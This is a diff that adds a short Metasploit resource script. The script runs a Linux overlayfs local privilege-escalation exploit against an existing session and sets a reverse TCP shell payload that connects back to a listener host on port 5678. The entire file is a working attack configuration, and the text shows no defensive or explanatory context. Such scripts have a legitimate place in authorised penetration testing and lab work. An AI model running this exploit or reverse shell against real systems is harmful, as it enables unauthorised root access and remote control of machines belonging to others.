@@ -1,0 +1,8 @@
+use exploit/linux/local/overlayfs_priv_esc
+set target 0
+set session $SESSION
+set payload linux/x86/shell/reverse_tcp
+set lhost $HOST_IP
+set lport 5678
+run -j
+
